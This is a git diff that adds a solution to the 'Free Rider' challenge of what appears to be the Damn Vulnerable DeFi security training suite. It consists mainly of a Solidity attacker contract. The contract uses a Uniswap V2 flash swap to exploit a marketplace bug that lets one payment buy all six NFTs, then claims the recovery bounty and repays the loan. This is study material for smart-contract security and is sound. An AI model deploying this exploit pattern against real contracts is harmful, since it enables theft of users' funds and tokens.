@@ -123,7 +123,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        FreeRiderAttacker attacker =
+            new FreeRiderAttacker(uniswapPair, weth, marketplace, nft, recoveryManager, player);
+        attacker.attack();
     }
 
     /**
@@ -145,4 +147,64 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract FreeRiderAttacker {
+    uint256 private constant NFT_PRICE = 15 ether;
+
+    IUniswapV2Pair private immutable pair;
+    WETH private immutable weth;
+    FreeRiderNFTMarketplace private immutable marketplace;
+    DamnValuableNFT private immutable nft;
+    FreeRiderRecoveryManager private immutable recoveryManager;
+    address private immutable beneficiary;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        WETH _weth,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager,
+        address _beneficiary
+    ) {
+        pair = _pair;
+        weth = _weth;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        beneficiary = _beneficiary;
+    }
+
+    function attack() external {
+        pair.swap(NFT_PRICE, 0, address(this), bytes("flash"));
+
+        payable(beneficiary).transfer(address(this).balance);
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        require(msg.sender == address(pair), "invalid pair");
+
+        weth.withdraw(amount0);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(beneficiary));
+        }
+
+        uint256 repayment = (amount0 * 1000) / 997 + 1;
+        weth.deposit{value: repayment}();
+        weth.transfer(address(pair), repayment);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return 0x150b7a02;
+    }
+
+    receive() external payable {}
 }
